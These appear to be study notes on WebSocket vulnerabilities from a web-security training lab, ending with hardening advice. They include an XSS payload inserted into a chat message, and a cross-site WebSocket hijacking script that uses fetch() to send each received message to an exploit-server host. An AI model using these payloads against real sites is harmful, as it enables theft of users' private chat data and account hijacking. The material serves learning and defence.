## Manipulating WebSocket messages to exploit vulnerabilities
#### Manipulating WebSocket messages to exploit vulnerabilities

- WebSockets are used for all kinds of purposes, including performing user actions and transmitting sensitive information. Virtually any web security vulnerability that arises with regular HTTP can also arise in relation to WebSockets communications.

- The majority of input-based vulnerabilities affecting WebSockets can be found and exploited by tampering with the contents of WebSocket messages.

- For example, suppose a chat application uses WebSockets to send chat messages between the browser and the server. When a user types a chat message, a WebSocket message like the following is sent to the server:

`{"message":"Hello Carlos"}`

- The contents of the message are transmitted (again via WebSockets) to another chat user, and rendered in the user's browser as follows:

`<td>Hello Carlos</td>`

- In this situation, provided no other input processing or defenses are in play, an attacker can perform a proof-of-concept XSS attack by submitting the following WebSocket message:

`{"message":"<img src=1 onerror='alert(1)'>"}`

#### Manipulating the WebSocket handshake to exploit vulnerabilities

- Misplaced trust in HTTP headers to perform security decisions, such as the `X-Forwarded-For` header.
- Flaws in session handling mechanisms, since the session context in which WebSocket messages are processed is generally determined by the session context of the handshake message.
- Attack surface introduced by custom HTTP headers used by the application

## Using cross-site WebSockets to exploit vulnerabilities

#### cross-site WebSocket hijacking

- the following WebSocket handshake request is probably vulnerable to CSRF, because the only session token is transmitted in a cookie

```js
GET /chat HTTP/1.1 
Host: normal-website.com 
Sec-WebSocket-Version: 13 
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w== 
Connection: keep-alive, Upgrade Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2 
Upgrade: websocket
```

- exploit :

```html
<script>
    var ws = new WebSocket('wss://0aba004704dc1d1c804c3f9200d6007b.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://exploit-0a61005304c11dc180a33e1d01f50053.exploit-server.net/exploit?message='+ btoa(event.data));
    };
</script>
```

## How to secure a WebSocket connection

- Use the `wss://` protocol (WebSockets over TLS).
- Hard code the URL of the WebSockets endpoint, and certainly don't incorporate user-controllable data into this URL.
- Protect the WebSocket handshake message against CSRF, to avoid cross-site WebSockets hijacking vulnerabilities.
- Treat data received via the WebSocket as untrusted in both directions. Handle data safely on both the server and client ends, to prevent input-based vulnerabilities such as SQL injection and cross-site scripting.
